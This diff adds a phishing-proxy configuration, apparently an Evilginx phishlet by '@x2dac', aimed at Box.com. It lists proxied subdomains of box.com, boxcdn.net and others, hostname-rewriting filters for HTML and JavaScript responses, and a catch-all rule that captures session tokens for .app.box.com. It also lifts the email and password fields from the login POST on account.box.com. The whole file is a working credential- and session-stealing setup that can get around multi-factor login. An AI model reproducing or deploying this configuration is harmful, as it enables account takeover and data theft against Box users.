@@ -1,0 +1,51 @@
+author: '@x2dac
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'box.com', session: true, is_landing: false}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'box.com', session: true, is_landing: true}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'box.com', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'company-target.com', session: false, is_landing: false}
+  - {phish_sub: 'cdn01', orig_sub: 'cdn01', domain: 'boxcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'cdn03', orig_sub: 'cdn03', domain: 'boxcdn.net', session: false, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'ww', domain: 'segment-box.com', session: false, is_landing: false}
+  - {phish_sub: 'sanalytics', orig_sub: 'sanalytics', domain: 'box.com', session: false, is_landing: false}
+  
+sub_filters:
+- {triggers_on: 'www.box.com', orig_sub: 'www', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'account', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'app', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'api', domain: 'company-target.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'cdn01', domain: 'boxcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'cdn03', domain: 'boxcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'www', domain: 'segment-box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'account.box.com', orig_sub: 'sanalytics', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+- {triggers_on: 'www.box.com', orig_sub: 'account', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'www.box.com', orig_sub: 'app', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'www.box.com', orig_sub: 'api', domain: 'company-target.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'www.box.com', orig_sub: 'cdn01', domain: 'boxcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'www.box.com', orig_sub: 'cdn03', domain: 'boxcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'www.box.com', orig_sub: 'www', domain: 'segment-box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+- {triggers_on: 'www.box.com', orig_sub: 'sanalytics', domain: 'box.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+ 
+auth_tokens:
+  - domain: '.app.box.com'
+    keys: ['.*, regexp']
+    
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password_login'
+    search: '(.*)'
+    type: 'post'
+
+login: 
+  domain: 'account.box.com'
+  path: '/login'
